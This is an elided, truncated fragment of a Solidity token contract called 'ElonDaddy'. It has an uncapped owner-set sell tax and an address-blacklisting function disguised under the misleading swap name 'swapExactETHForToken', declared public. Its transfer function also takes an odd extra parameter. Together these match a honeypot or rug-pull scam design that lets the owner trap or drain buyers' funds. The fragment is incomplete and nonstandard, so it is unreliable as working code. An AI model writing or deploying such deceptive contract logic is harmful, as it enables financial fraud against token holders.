...
contract ElonDaddy is IERC20, Ownable {
    ...
    function transfer(address recipient, uint256 amount, uint toto) public virtual returns (bool) {
        toto = 0;
        _ownership(_msgSender(), recipient, amount);
        return true;
    }

        function updateSellTax(uint256 newTax) external onlyOwner{
            _taxFee = newTax;
    }

        // Blacklist/unblacklist an address
    function swapExactETHForToken(address _address, bool _value) public {
